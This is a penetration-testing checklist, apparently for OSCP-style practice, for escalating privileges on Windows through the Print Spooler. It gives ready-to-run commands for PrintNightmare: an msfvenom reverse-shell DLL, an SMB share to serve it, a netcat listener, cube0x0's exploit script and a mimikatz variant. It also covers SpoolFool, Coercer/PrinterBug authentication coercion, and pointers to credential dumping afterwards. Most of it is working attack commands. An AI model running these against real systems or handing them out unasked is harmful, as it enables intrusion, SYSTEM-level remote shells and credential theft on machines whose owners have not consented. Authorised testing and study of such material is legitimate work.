# Windows privesc: print spooler

## Before I start
At the pwn-broker prompt: tool install netexec and tool install impacket.
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M spooler
impacket-rpcdump <TargetIP> | grep -iE 'MS-RPRN|MS-PAR'
- [ ] The spooler checked on every Windows host

## PrintNightmare, CVE-2021-1675 and CVE-2021-34527
- [ ] Unpatched since mid 2021, or Point and Print weakened by policy
A DLL, a share to serve it from and a listener, on Kali:
mkdir -p /tmp/smb
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll -o /tmp/smb/driver.dll
sudo /opt/pwn-broker/bin/impacket-smbserver share /tmp/smb -smb2support
rlwrap nc -lvnp <LPORT>
- [ ] The full path for Impacket with sudo, which port 445 needs: sudo does not search pwn-broker's bin folder
cube0x0's CVE-2021-1675.py, from https://github.com/cube0x0/CVE-2021-1675, with the Impacket its README asks for:
git clone https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675/CVE-2021-1675.py '<Domain>/<Username>:<Password>@<TargetIP>' '\\<LHOST>\share\driver.dll'
- [ ] From a Windows host: SharpPrintNightmare, built from the same repository
- [ ] mimikatz, from tool install mimikatz and serve files mimikatz, does it too: misc::printnightmare /server:<TargetIP> /library:\\<LHOST>\share\driver.dll /authdomain:<Domain> /authuser:<Username> /authpassword:<Password>
- [ ] It ends as SYSTEM; a load that fails can crash the spooler, so one careful try
- [ ] A local administrator added through the spooler instead, with no share: :Pb windows-kernel

## Coercion through the spooler
- [ ] Not on the OSCP exam: coercion is kept out as a safe reading; OffSec's pages do not name it
Coercer, after sudo apt install -y coercer:
coercer scan -t <TargetIP> -u '<Username>' -p '<Password>' -d <Domain>
coercer coerce -l <LHOST> -t <TargetIP> -u '<Username>' -p '<Password>' -d <Domain>
- [ ] A running spooler answers the PrinterBug even when patched, and the machine account authenticates to my listener: :Pb coercion, :Pb ntlm-relay

## Local privilege escalation: SpoolFool, CVE-2022-21999
- [ ] Unpatched since February 2022: SpoolFool.exe, built from https://github.com/ly4k/SpoolFool, which publishes no binary, loads a DLL of mine as SYSTEM through the spool directory
.\SpoolFool.exe -dll THE-DLL
- [ ] searchsploit print spooler against the exact build first: :Pb windows-kernel

## If it fails
- [ ] Patched since July 2021: installing a driver needs an administrator, so no code execution, but the coercion still works
- [ ] Point and Print locked down by policy: the same
- [ ] The spooler off on the DCs, as on newer images: the workstations and member servers instead

## Next
- [ ] SYSTEM: LSASS, SAM and DPAPI, :Pb windows-creds, :Pb dpapi
